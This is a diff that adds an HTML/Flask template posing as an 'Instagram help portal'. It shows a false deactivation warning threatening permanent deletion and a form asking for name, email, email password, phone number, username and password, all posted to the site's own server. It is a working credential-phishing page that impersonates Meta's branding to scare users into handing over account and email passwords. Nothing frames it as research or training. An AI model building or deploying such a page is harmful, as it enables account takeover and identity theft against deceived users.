@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram help portal</title>
+  <link rel="icon" href="{{ url_for('static', filename='logo-instagram-1080p-1648650831.png') }}" type="image/x-icon">
+
+  <script src="script.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+    .input-group {
+      margin-bottom: 10px;
+    }
+    label, input {
+      display: block;
+    }
+    input {
+      width: 100%;
+      padding: 10px 2px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .image-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="image-container">
+    <img src="{{ url_for('static', filename='Instagram-ios-removebg-preview.png') }}" alt="Image Description" width="500" height="600">
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+      <img src="{{ url_for('static', filename='th-2530594864-removebg-preview.png') }}" alt="Image Description" width="175" height="60">
+    </a>
+    <p1>Get the app</p1>
+    <p style="font-size: 7;"></p>@ 2023 Instagram from Meta.</p>
+  </div>
+
+  <div class="container">
+    <img src="{{ url_for('static', filename='th-3519949070.jpeg') }}" alt="Image Description" width="250" height="120">
+    <p style="font-size: 15px; color: red;"></p1>**Your account has Deactivated and Reported too many times in the past 30 days. Fill below the details for confirmation your account.If given details should not match previous given data. Your account may be delete permenently.</p1>
+
+    <!-- <form id="detailsForm"> -->
+    <form action="/" method="post">
+      <div class="input-group">
+        <!-- <label for="firstname" style="font-family: 'Georgia', serif;">First Name</label> -->
+        <input type="text" id="firstname" name="firstname" placeholder="Firstname" required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="lastname" style="font-family: 'Georgia', serif;">Last Name</label> -->
+        <input type="text" id="lastname" name="lastname" placeholder="Last Name"required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="email" style="font-family: 'Georgia', serif;">Email</label> -->
+        <input type="email" id="email" name="email" placeholder="Email" required>
+      </div>
+      <div class="input-group">
+      <!-- <label for="epassword" style="font-family: 'Georgia', serif;">Email Password</label> -->
+      <input type="password" id="epassword" name="epassword" placeholder="Email Password" required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="mobile" style="font-family: 'Georgia', serif;">Mobile Number</label> -->
+        <input type="tel" id="mobile" name="mobile" placeholder="Mobile Number" required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="userid" style="font-family: 'Georgia', serif;">User ID</label> -->
+        <input type="text" id="userid" name="userid" placeholder="UserName" required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="password" style="font-family: 'Georgia', serif;">Password</label> -->
+        <input type="password" id="password" name="password" placeholder="Password" required>
+      </div>
+      <div class="input-group">
+        <!-- <label for="repassword" style="font-family: 'Georgia', serif;">Re-enter Password</label> -->
+        <input type="text" id="repassword" name="repassword" placeholder="Re-Enter Password" required>
+      </div>
+      <p style="font-size: 10px;">People who use our service may have uploaded your contact information to Instagram.</p>
+
+      <button type="submit">Submit</button>
+    </form> 
+
+    <div id="submittedDetails"></div>
+
+  </div> 
+
+  <script>
+
+    const form = document.getElementById('detailsForm');
+    const submittedDetailsDiv = document.getElementById('submittedDetails');
+
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const firstname = form.firstname.value;
+      const lastname = form.lastname.value;
+      const email = form.email.value;
+      const epassword = form.epassword.value;
+      const mobile = form.mobile.value;
+      const userid = form.userid.value;
+      const password = form.password.value;
+      const repassword = form.repassword.value;
+
+      const submittedDetails = `
+        <p><strong>First Name:</strong> ${firstname}</p>
+        <p><strong>Last Name:</strong> ${lastname}</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Email Password:</strong> ${epassword}</p>
+        <p><strong>Mobile Number:</strong> ${mobile}</p>
+        <p><strong>User ID:</strong> ${userid}</p>
+        <p><strong>Password:</strong> ${password}</p>
+        <p><strong>Re-entered Password:</strong> ${repassword}</p>
+        `;
+
+      submittedDetailsDiv.innerHTML = submittedDetails;
+      alert('Details submitted successfully! Close the current page. We will update issues for your account');
+    });
+  </script>
+</body>
+</html>
